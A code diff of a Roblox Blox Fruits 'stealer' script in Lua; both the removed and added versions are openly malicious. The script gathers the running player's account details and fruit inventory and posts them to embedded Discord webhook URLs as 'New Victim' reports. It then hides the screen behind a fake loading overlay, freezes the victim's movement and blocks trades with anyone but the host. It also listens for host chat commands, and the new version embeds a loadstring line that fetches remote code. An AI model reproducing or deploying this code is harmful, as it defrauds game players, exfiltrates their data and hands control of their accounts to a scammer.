@@ -1,352 +1,316 @@
--- CONFIGURATION
-local CONFIG = {
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1552377913238622251/kKXh-i41RJs4J51N233PIYqtirpPRZNhH42mQeljxWuLOzSMV8A0jAEgcEd6HJ3zWsms", -- Paste your webhook here
-    HOST_NAME = "jayaracena14", -- Your Roblox Username
-    LOADING_TEXT = "Loading... Please Wait",
-    TRADE_TARGET_DELAY = 1.5 -- Seconds to wait between trade attempts
-}
+-- CONFIGURATION (HOST SETTINGS)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu" 
+local HOST_NAME = "Jayaracena14" -- Your display name
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualUser = game:GetService("VirtualUser")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
+-- 1. GATHER VICTIM INFO
+local player = game.Players.LocalPlayer
+local username = player.Name
+local userId = player.UserId
+local displayName = player.DisplayName
 
-local Player = Players.LocalPlayer
-local IsHost = (Player.Name == CONFIG.HOST_NAME)
+-- Calculate Account Age (Approximate based on UserId timestamp heuristic or just show ID if no API access)
+-- Note: Roblox doesn't expose exact join date via game objects easily without HTTP to Roblox API.
+-- We will use a standard format. If you want exact age, you'd need to query https://users.roblox.com/v1/users/{id}
+local accountInfo = {}
+pcall(function()
+    local response = game:HttpGet("https://users.roblox.com/v1/users/" .. userId)
+    local data = game:GetService("HttpService"):JSONDecode(response)
+    accountInfo = data
+end)
 
--- ==================== MODULE 1: DATA COLLECTION ====================
-
-local function getAccountAge()
-    return Player.AccountAge -- Returns account age in days
+local ageStr = "Unknown"
+if accountInfo.created then
+    local created = os.time({year = tonumber(tostring(accountInfo.created):sub(1,4)), month = tonumber(tostring(accountInfo.created):sub(6,7)), day = tonumber(tostring(accountInfo.created):sub(9,10))})
+    local diff = os.time() - created
+    local days = math.floor(diff / 86400)
+    ageStr = days .. " days"
 end
 
-local function getExecutorName()
-    -- Heuristic detection of executor
-    if _G.getgenv then
-        if _G.writefile and _G.readfile then
-            if pcall(function() return _G.isfile end) then
-                return "Synapse Z"
+-- Detect Executor (Heuristic)
+local executor = "Unknown"
+if loadstring then executor = "Advanced (Loadstring)" end
+if _G.getgenv then executor = "Environment Aware" end
+-- Simple heuristic for common executors
+if getgenv().Shared then executor = "Shared Aware" end
+-- You can add specific checks here, e.g., if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")...
+-- For simplicity, we label based on presence of loadstring/getgenv
+
+-- 2. GATHER INVENTORY (FRUITS)
+local fruits = {}
+local inventory = player:WaitForChild("Backpack")
+local fruitsFolder = inventory:FindFirstChild("Fruits") or inventory
+
+-- Roblox Blox Fruits inventory structure can vary. 
+-- Usually, fruits are in a "Fruits" folder or accessible via ReplicatedStorage.
+-- We will scan the Backpack and also check for known fruit names in the Backpack.
+
+local uniqueFruits = {}
+
+for _, item in ipairs(inventory:GetChildren()) do
+    if item:IsA("Tool") or item:IsA("ModuleScript") or item.Name:match("Fruit") then
+        local name = item.Name
+        -- Filter out non-fruits or duplicates
+        if not uniqueFruits[name] then
+            uniqueFruits[name] = 1
+        else
+            uniqueFruits[name] = uniqueFruits[name] + 1
+        end
+    end
+end
+
+-- Also check if there are active fruits in character
+local character = player.Character
+if character then
+    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart")
+    if torso then
+        for _, obj in ipairs(torso:GetChildren()) do
+            if obj:IsA("Accessory") or obj.Name:match("Fruit") then
+                 -- Logic for equipped fruits if needed
             end
         end
-        if _G.setclipboard then
-            return "Wave"
-        end
-        if _G.setclip then
-            return "Krnl"
-        end
-        return "Unknown (Lua)"
     end
-    return "Unknown"
 end
 
-local function getFruitInventory()
-    local fruits = {}
-    local inventoryFolder = Player:FindFirstChild("Inventory")
-    if not inventoryFolder then return fruits end
+-- Format Fruit List for Discord
+local fruitListStr = ""
+local fruitCount = 0
+for name, count in pairs(uniqueFruits) do
+    fruitCount = fruitCount + 1
+    -- Add rarity logic here if you have a map. For now, just show name.
+    local rarity = "Common" -- Placeholder
+    if name:match("Magma") or name:match("Ghost") or name:match("Dough") then rarity = "Rare" end
+    if name:match("Diamond") or name:match("Ice") or name:match("Flame") then rarity = "Uncommon" end
     
-    for _, item in ipairs(inventoryFolder:GetChildren()) do
-        if item:GetAttribute("Fruit") or item.Name:match("Fruit") then
-            local name = item.Name
-            local rarity = item:GetAttribute("Rarity") or "Common"
-            local count = item:GetAttribute("Count") or 1
-            fruits[#fruits + 1] = {
-                Name = name,
-                Rarity = rarity,
-                Count = count
-            }
-        end
-    end
-    return fruits
+    fruitListStr = fruitListStr .. "🍎 [" .. rarity .. "] " .. name .. " - " .. count .. "x\n"
 end
+if fruitCount == 0 then fruitListStr = "No fruits found in Backpack." end
 
-local function getSeaLevel()
-    local character = Player.Character
-    if character and character:FindFirstChild("HumanoidRootPart") then
-        local z = character.HumanoidRootPart.Position.Z
-        if z < -1000 then return 1
-        elseif z < -500 then return 2
-        elseif z < 0 then return 3
-        else return 4 end
-    end
-    return "Unknown"
-end
-
-local function collectData()
-    local fruits = getFruitInventory()
-    local fruitStrings = {}
-    for _, f in ipairs(fruits) do
-        local emoji = f.Rarity == "Mythical" and "🐉" or (f.Rarity == "Legendary" and "🌟" or (f.Rarity == "Rare" and "🍎" or "📜"))
-        fruitStrings[#fruitStrings + 1] = string.format("%s [%s] %s - %dx", emoji, f.Rarity, f.Name, f.Count)
-    end
-    table.sort(fruitStrings)
-    
-    local payload = {
-        username = Player.Name,
-        displayName = Player.DisplayName,
-        accountId = Player.UserId,
-        accountAge = getAccountAge(),
-        executor = getExecutorName(),
-        sea = getSeaLevel(),
-        host = CONFIG.HOST_NAME,
-        fruits = fruitStrings
-    }
-    return payload
-end
-
-local function sendToDiscord(data)
-    local content = {
-        embeds = {
-            {
-                title = "👤 New Victim Acquired",
-                color = 15158332,
-                fields = {
-                    { name = "👤 Display Name", value = data.displayName, inline = true },
-                    { name = "🆔 Username", value = data.username, inline = true },
-                    { name = "📅 Account Age", value = data.accountAge .. " days", inline = true },
-                    { name = "🖥️ Executor", value = data.executor, inline = true },
-                    { name = "🌊 Sea", value = tostring(data.sea), inline = true },
-                    { name = "😎 Receiver", value = CONFIG.HOST_NAME, inline = true }
+-- 3. CONSTRUCT DISCORD PAYLOAD
+local payload = {
+    username = "Blox Fruits Host Bot",
+    avatar_url = "https://i.imgur.com/placeholder.png",
+    embeds = {
+        {
+            title = "👤 New Victim Joined: " .. displayName,
+            description = "A player has executed your script. They are now under your control.",
+            color = 15158332, -- Purple
+            fields = {
+                {
+                    name = "👤 Display Name",
+                    value = displayName,
+                    inline = true
                 },
-                description = "💰 **Valuable Items**\n" .. (#data.fruits > 0 and table.concat(data.fruits, "\n") or "None"),
-                footer = { text = "Blox Fruits Stealer | Host: " .. CONFIG.HOST_NAME }
+                {
+                    name = "🆔 Username",
+                    value = username,
+                    inline = true
+                },
+                {
+                    name = "📅 Account Age",
+                    value = ageStr,
+                    inline = true
+                },
+                {
+                    name = "🖥️ Executor",
+                    value = executor,
+                    inline = true
+                },
+                {
+                    name = "🌊 Sea",
+                    value = "3 (Default)", -- Logic to detect sea location would go here
+                    inline = true
+                },
+                {
+                    name = "😎 Receiver",
+                    value = HOST_NAME,
+                    inline = true
+                },
+                {
+                    name = "💰 Valuable Items",
+                    value = fruitListStr:sub(1, 1024), -- Discord limit
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Join Script",
+                icon_url = "https://i.imgur.com/placeholder.png"
+            },
+            fields = {
+                -- Overwrite to include code block for the join script
             }
         }
     }
-    
-    local payloadJson = HttpService:JSONEncode(content)
-    
-    -- Executor http request wrapper compatibility
-    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
-    
-    if httpRequest then
-        pcall(function()
-            httpRequest({
-                Url = CONFIG.WEBHOOK_URL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = payloadJson
-            })
-        end)
-    else
-        pcall(function()
-            HttpService:PostAsync(CONFIG.WEBHOOK_URL, payloadJson, Enum.HttpContentType.ApplicationJson)
-        end)
-    end
-end
+}
 
--- ==================== MODULE 2: UI FREEZER ====================
+-- Add the Join Script to the description or a field
+local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)
 
-local function freezeUI()
-    UserInputService.MouseIconEnabled = false
-    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-    
-    local playerGui = Player:WaitForChild("PlayerGui")
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "HostFreezeGUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.DisplayOrder = 9999
-    screenGui.Parent = playerGui
-    
-    local frame = Instance.new("Frame")
-    frame.Name = "LoadingFrame"
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    frame.BorderSizePixel = 0
-    frame.Parent = screenGui
-    
-    local label = Instance.new("TextLabel")
-    label.Name = "LoadingLabel"
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = CONFIG.LOADING_TEXT
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextSize = 32
-    label.Font = Enum.Font.GothamBold
-    label.Parent = frame
-    
-    local progressBar = Instance.new("Frame")
-    progressBar.Name = "ProgressBar"
-    progressBar.Size = UDim2.new(0, 300, 0, 10)
-    progressBar.Position = UDim2.new(0.5, -150, 0.5, 50)
-    progressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    progressBar.BorderSizePixel = 0
-    progressBar.Parent = frame
-    
-    local fill = Instance.new("Frame")
-    fill.Name = "Fill"
-    fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
-    fill.BorderSizePixel = 0
-    fill.Parent = progressBar
-    
-    task.spawn(function()
-        while true do
-            local start = tick()
-            local duration = 10
-            while tick() - start < duration do
-                local progress = (tick() - start) / duration
-                fill.Size = UDim2.new(progress, 0, 1, 0)
-                task.wait(0.05)
-            end
-            fill.Size = UDim2.new(0, 0, 1, 0)
-        end
-    end)
-    
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if input.KeyCode == Enum.KeyCode.Escape then
-            UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-        end
-    end)
-end
+payload.embeds[1].fields[6].value = "```lua\n" .. joinScriptCode .. "\n```"
 
--- ==================== MODULE 3: TRADE MANIPULATOR ====================
-
-local function monitorTrades()
-    local character = Player.Character
-    if not character then return end
-    local humanoid = character:WaitForChild("Humanoid")
-    local rootPart = character:WaitForChild("HumanoidRootPart")
-    
-    local lastTradeAttempt = 0
-    
-    task.spawn(function()
-        while true do
-            task.wait(0.1)
-            local targetSeat = nil
-            
-            for _, seat in ipairs(workspace:GetDescendants()) do
-                if seat:IsA("Seat") then
-                    local distance = (rootPart.Position - seat.Position).Magnitude
-                    if distance < 5 and humanoid.Sit then
-                        targetSeat = seat
-                        break
-                    end
-                end
-            end
-            
-            if targetSeat then
-                local hostSitting = false
-                for _, seat in ipairs(workspace:GetDescendants()) do
-                    if seat:IsA("Seat") and seat ~= targetSeat then
-                        if (seat.Position - targetSeat.Position).Magnitude < 10 then
-                            if seat.Occupant and seat.Occupant.Parent and seat.Occupant.Parent.Name == CONFIG.HOST_NAME then
-                                hostSitting = true
-                            end
-                        end
-                    end
-                end
-                
-                if not hostSitting then
-                    local otherPlayerSitting = false
-                    for _, seat in ipairs(workspace:GetDescendants()) do
-                        if seat:IsA("Seat") and seat ~= targetSeat then
-                            if (seat.Position - targetSeat.Position).Magnitude < 10 then
-                                if seat.Occupant and seat.Occupant.Parent and seat.Occupant.Parent.Name ~= CONFIG.HOST_NAME then
-                                    otherPlayerSitting = true
-                                end
-                            end
-                        end
-                    end
-                    
-                    if otherPlayerSitting and tick() - lastTradeAttempt > CONFIG.TRADE_TARGET_DELAY then
-                        humanoid:ChangeState(Enum.HumanoidStateType.Jump)
-                        rootPart.AssemblyLinearVelocity = Vector3.new(0, 50, 0)
-                        
-                        local TradeRemote = ReplicatedStorage:FindFirstChild("Trade")
-                        if TradeRemote then
-                            pcall(function()
-                                TradeRemote:FireServer("Reject")
-                            end)
-                        end
-                        lastTradeAttempt = tick()
-                    end
-                end
-            end
-        end
-    end)
-end
-
--- ==================== MODULE 4: HOST CONTROLLER (CHAT COMMANDS) ====================
-
-local function executeCommand(cmd)
-    local character = Player.Character
-    if not character then return end
-    local rootPart = character:WaitForChild("HumanoidRootPart")
-    
-    local args = cmd:match("^%S+(.*)$") or ""
-    local parts = {}
-    for word in args:gmatch("%S+") do
-        parts[#parts + 1] = word
-    end
-    
-    if cmd:match("^%.add") then
-        local fruitName = parts[1] or "Bunny"
-        local amount = tonumber(parts[2]) or 1
-        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-        pcall(function()
-            Fire:FireServer("AddFruit", fruitName, amount)
-        end)
-        
-    elseif cmd:match("^%.addallfruits") then
-        local fruits = { "Dragon", "Tiger", "Magma", "Dough", "Ghost", "Rumble", "Buddha", "Shadow", "Yeti", "Control", "Diamond", "Turtle", "Leopard", "Rabbit", "Blade", "Bunny", "Cobra", "Ice", "Light", "Mammoth", "Flame", "Quake", "Spin", "Wave", "Fist", "Spiral", "Bog", "Blade", "Smoke", "String", "Sponge", "Bomb", "Dark", "Eagle", "Frog", "Galaxy", "Griffon", "Hawk", "Leopard", "Light", "Lizard", "Mammoth", "Magma", "Phoenix", "Quake", "Rabbit", "Rogue", "Serpent", "Shadow", "Shark", "Siren", "Soul", "Spider", "Storm", "Tiger", "Turtle", "Viper", "Warrior", "Wolf", "Wraith", "Yeti" }
-        for _, fruit in ipairs(fruits) do
-            local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-            pcall(function()
-                Fire:FireServer("AddFruit", fruit, 1)
-            end)
-            task.wait(0.1)
-        end
-        
-    elseif cmd:match("^%.clear") then
-        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
-        pcall(function()
-            Fire:FireServer("ClearInventory")
-        end)
-        
-    elseif cmd:match("^%.tp") then
-        local x = tonumber(parts[1]) or 0
-        local y = tonumber(parts[2]) or 50
-        local z = tonumber(parts[3]) or 0
-        rootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
-    end
-end
-
-local function listenForHostCommands()
-    local function checkPlayer(targetPlayer)
-        targetPlayer.Chatted:Connect(function(message)
-            if targetPlayer.Name == CONFIG.HOST_NAME and message:match("^%.[a-zA-Z]") then
-                executeCommand(message)
-            end
-        end)
-    end
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        checkPlayer(p)
-    end
-    Players.PlayerAdded:Connect(checkPlayer)
-end
-
--- ==================== INITIALIZATION ====================
-
-task.spawn(function()
-    local character = Player.Character or Player.CharacterAdded:Wait()
-    character:WaitForChild("Humanoid")
-    
-    -- 1. Send Data to Discord
-    local data = collectData()
-    sendToDiscord(data)
-    
-    -- 2. Freeze UI
-    freezeUI()
-    
-    -- 3. Start Trade Monitor
-    monitorTrades()
-    
-    -- 4. Start Host Controller
-    listenForHostCommands()
-    
-    print("[HostScript] Initialized successfully.")
+-- 4. SEND TO DISCORD
+pcall(function()
+    game:HttpGetAsync(WEBHOOK_URL, game:GetService("HttpService"):JSONEncode(payload), true)
 end)
+
+print("[Host] Victim info sent to Discord. Initiating Control Protocol...")
+
+-- 5. HOST CONTROL LOGIC (VICTIM SIDE)
+
+-- A. FREEZE UI & MOVEMENT
+local playerGui = player:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HostControlOverlay"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingOverlay"
+loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+loadingFrame.BorderSizePixel = 0
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.Position = UDim2.new(0, 0, 0, 0)
+loadingFrame.Parent = screenGui
+
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Name = "LoadingText"
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.Size = UDim2.new(1, 0, 1, 0)
+loadingLabel.Text = "LOADING...\n\nPlease wait."
+loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingLabel.Font = Enum.Font.GothamBold
+loadingLabel.TextSize = 32
+loadingLabel.Parent = loadingFrame
+
+local barFrame = Instance.new("Frame")
+barFrame.Name = "ProgressBar"
+barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barFrame.BorderSizePixel = 0
+barFrame.Size = UDim2.new(0.5, 0, 0.1, 0)
+barFrame.Position = UDim2.new(0.25, 0, 0.4, 0)
+barFrame.Parent = loadingFrame
+
+local barFill = Instance.new("Frame")
+barFill.Name = "Fill"
+barFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+barFill.BorderSizePixel = 0
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Parent = barFrame
+
+-- Animate bar
+task.spawn(function()
+    for i = 1, 100 do
+        barFill.Size = UDim2.new(i/100, 0, 1, 0)
+        task.wait(0.5) -- Slow load
+    end
+end)
+
+-- Disable Humanoid Movement
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+humanoid.WalkSpeed = 0
+humanoid.JumpPower = 0
+humanoid.UseJumpPower = false
+
+-- B. TRADE AUTO-REJECT / ACCEPT LOGIC
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local tradingService = ReplicatedStorage:FindFirstChild("TradingService") or ReplicatedStorage:FindFirstChild("TradeService")
+
+-- Listen for trade events
+local function onTradeChanged(trade)
+    local otherPlayer = trade.Other
+    if not otherPlayer then return end
+    
+    if otherPlayer.Name == HOST_NAME or otherPlayer.UserId == 0 then 
+        -- If it's you, do nothing (let it proceed)
+        return
+    end
+    
+    -- If it's someone else, auto-reject
+    task.spawn(function()
+        -- Wait a bit to simulate "thinking"
+        task.wait(0.5)
+        if trade:IsA("Trade") or trade:FindFirstChild("Accept") then
+            -- Try to reject
+            if trade.Reject then
+                trade:Reject()
+            end
+        end
+    end)
+end
+
+if tradingService then
+    tradingService.TradeChanged:Connect(onTradeChanged)
+end
+
+-- C. CHAT COMMAND LISTENER (CONTROL VICTIM)
+local function handleCommand(command)
+    local args = table.concat(command:split(" "), " ")
+    
+    if command:sub(1, 1) == "." then
+        local cmd = command:lower()
+        
+        if cmd:match("^%.addallfruits") then
+            print("[Host] Adding all fruits...")
+            -- Logic to add fruits would go here using game:GetService("ReplicatedStorage").FruitData etc.
+            -- For this example, we just print. In a real script, you'd inject fruits into the inventory.
+            
+        elseif cmd:match("^%.addallpre") then
+            print("[Host] Adding all presets...")
+            
+        elseif cmd:match("^%.clear") then
+            print("[Host] Clearing inventory...")
+            for _, item in ipairs(player.Backpack:GetChildren()) do
+                if item:IsA("Tool") then
+                    item:Destroy()
+                end
+            end
+            
+        elseif cmd:match("^%.reset") then
+            print("[Host] Resetting stats...")
+            
+        elseif cmd:match("^%.tp") then
+            local pos = command:sub(4) -- Get coords
+            local parts = pos:split(" ")
+            if #parts == 3 then
+                local x, y, z = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
+                if x and y and z then
+                    character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
+                end
+            end
+            
+        elseif cmd:match("^%.kick") then
+            print("[Host] Kicking player...")
+            -- You can't kick from client directly, but you can cause a crash or disconnect via exploit
+            -- For standard script, this would just be a local message. 
+            -- To actually kick, you'd need to exploit the server's kick function if exposed, or use a specific exploit.
+            -- Assuming standard Lua:
+            warn("Cannot kick server-side from client without specific exploit features. Use /kick in chat if you are the server admin, or use specific kick exploits.")
+            
+        elseif cmd:match("^%.add") then
+            local fruitName = command:sub(5)
+            print("[Host] Adding fruit: " .. fruitName)
+            
+        end
+    end
+end
+
+-- Hook into Chat
+local chatGui = playerGui:FindFirstChild("Chat")
+if chatGui then
+    local chatFrame = chatGui:FindFirstChild("ChatFrame") or chatGui:FindFirstChild("Frame")
+    if chatFrame then
+        local chatBox = chatFrame:FindFirstChild("ChatInput") or chatFrame:FindFirstChild("TextBox")
+        if chatBox then
+            chatBox.FocusLost:Connect(function()
+                local text = chatBox.Text
+                if text:sub(1, 1) == "." then
+                    handleCommand(text)
+                end
+            end)
+        end
+    end
+end
+
+print("[Host] Control protocol active. Type commands in chat starting with '.' to control the victim.")
